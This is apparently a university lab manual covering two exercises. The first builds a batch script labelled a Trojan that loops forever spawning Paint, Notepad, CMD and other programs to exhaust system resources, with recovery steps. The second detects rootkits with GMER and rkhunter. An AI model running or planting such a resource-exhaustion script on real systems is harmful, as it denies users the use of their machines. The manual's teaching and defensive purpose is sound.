# Experiment 10: Defeating Malware - Building Trojans & Rootkit Hunter

This experiment consists of two parts:
- **Ex 10(a)**: Defeating Malware - Building Trojans (Demonstration)
- **Ex 10(b)**: Defeating Malware - Rootkit Hunter (Detection using GMER / rkhunter)

---

## EXPERIMENT 10(a): Defeating Malware - Building Trojans

### AIM
To build a simple Trojan script using Windows Batch language and understand the impact/harm of Trojan malware in a computer system.

### WHAT IS A TROJAN?
A Trojan horse (or Trojan) is malicious software that disguises itself as legitimate or harmless software to trick users into executing it. Once executed, it can launch unauthorized processes, open backdoors, steal sensitive information, or cause Denial of Service (DoS) by exhausting system resources.

---

### CODE (`Trojan.bat`)
Create a file named `Trojan.bat` with the following batch script:

```bat
@echo off
:x
start mspaint
start notepad
start cmd
start explorer
start control
start calc
goto x
```

---

### STEP-BY-STEP PROCEDURE FOR EX 10(a)

1. Open **Notepad**.
2. Copy and paste the batch script shown above.
3. Save the file as `Trojan.bat` in your working directory.
4. Execute `Trojan.bat` by double-clicking it or running it in Command Prompt:
   ```cmd
   .\Trojan.bat
   ```
5. **Observation**: The script enters an infinite loop (`goto x`), continuously spawning new instances of MS-Paint, Notepad, CMD, File Explorer, Control Panel, and Calculator.
6. **Stopping / Recovery**:
   - Press `Ctrl + C` in the CMD terminal window to interrupt batch execution.
   - Alternatively, terminate processes via Task Manager or run:
     ```cmd
     taskkill /f /im cmd.exe
     taskkill /f /im mspaint.exe
     taskkill /f /im notepad.exe
     taskkill /f /im calc.exe
     ```
   - Restart the computer if system resources become unresponsive.

---

## EXPERIMENT 10(b): Defeating Malware - Rootkit Hunter

### AIM
To install a Rootkit Hunter tool (GMER for Windows / rkhunter for Linux) and detect hidden rootkits/malware on a computer system.

### WHAT IS A ROOTKIT?
A rootkit is a collection of software tools designed to grant unauthorized administrative access to a computer while hiding its presence, processes, registry entries, or files from standard operating system detection mechanisms.

---

### STEP-BY-STEP PROCEDURE FOR EX 10(b)

#### Option 1: Windows Environment using GMER Tool

1. **Download GMER**:
   - Visit GMER official website ([gmer.net](http://www.gmer.net)).
   - Click **Download EXE**.
   - *Note*: GMER is downloaded with a randomized executable name (e.g. `gmer_39a1.exe`) so hidden rootkits cannot identify and terminate `gmer.exe`.

2. **Launch GMER**:
   - Right-click the downloaded `.exe` file and select **Run as Administrator**.

3. **Configure & Start Scan**:
   - In the GMER window, check the scan options on the right pane (Processes, Modules, Services, Files, Registry, IAT/EAT, Devices, Quick scan, etc.).
   - Click the **Scan** button in the lower-right corner.
   - Wait while GMER scans system memory, driver hooks, and the hard drive.

4. **Identify & Remediate Rootkits**:
   - Any hidden processes, modified kernel functions, or rootkit hooks will be highlighted in **RED text**.
   - **To Delete**: Right-click the highlighted red item and select **Delete**.
   - **To Disable Service**: Right-click protected service items, select **Disable**, reboot the system, rerun GMER scan, and delete the file.

---

#### Option 2: Linux Environment using `rkhunter` (Rootkit Hunter)

1. **Install rkhunter**:
   - Ubuntu / Debian:
     ```bash
     sudo apt update
     sudo apt install rkhunter -y
     ```
   - Fedora / RHEL:
     ```bash
     sudo dnf install rkhunter -y
     ```

2. **Update Database & System Hashes**:
   ```bash
   sudo rkhunter --update
   sudo rkhunter --propupd
   ```

3. **Perform System Scan**:
   ```bash
   sudo rkhunter -c --sk
   ```
   *(Option `-c` performs check, `--sk` skips interactive keypress prompts)*

4. **Review Results**:
   Inspect the detailed log file generated at:
   ```bash
   cat /var/log/rkhunter.log
   ```

---

## RESULT
- **Ex 10(a)**: A Trojan script was successfully created, executed, and its resource exhaustion behavior was observed.
- **Ex 10(b)**: Rootkit Hunter tools (GMER / rkhunter) were installed, executed, and used to scan and identify malware/rootkits.
